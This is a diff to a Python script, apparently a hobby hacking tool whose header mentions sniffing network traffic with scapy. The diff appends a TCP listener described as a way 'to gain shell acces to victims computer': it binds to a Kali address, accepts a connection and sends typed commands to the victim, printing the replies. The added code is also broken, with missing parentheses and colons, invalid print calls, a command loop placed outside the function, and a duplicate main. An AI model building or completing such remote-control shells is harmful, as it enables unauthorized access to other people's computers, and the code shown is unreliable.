@@ -7,6 +7,7 @@ caprures network traffic by sniffing with scapy
 
 
 import sqlite3
+import socket
 import os
 from selenium import webdriver
 from selenium.webdriver.common.by import By
@@ -81,3 +82,40 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+
+    '''
+
+    basic tcp server to gain shell acces to victims computer
+
+
+    '''
+
+def connect():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM  # start a socket object
+    
+    s.bind(("10.0.2.15", 8080)) # define the kali ip and listening port
+
+    s.listen(1)  # defines the backlog size, since we're doing 1 connection the value is set to 1
+
+    print '[+] listening for incoming tcp connections on 8080'
+
+    conn, addr = s.accept() # accept function will return the connection object conn and will port in a tuple format
+
+    print '[+]we received a connection from: ' addr
+
+
+while True:
+    command = raw_input("Shell> ") # get user input and store it in command variable
+
+    if 'terminate' in command  # if we get the terminate command inform client and close connection
+        conn.send('terminate')
+        conn.close()
+        break
+    else:
+        conn.send(command) # otherwise we will send command to the target
+        print.conn.recv(1024) # and print the results we get back
+
+def main():
+    connect()
+main()
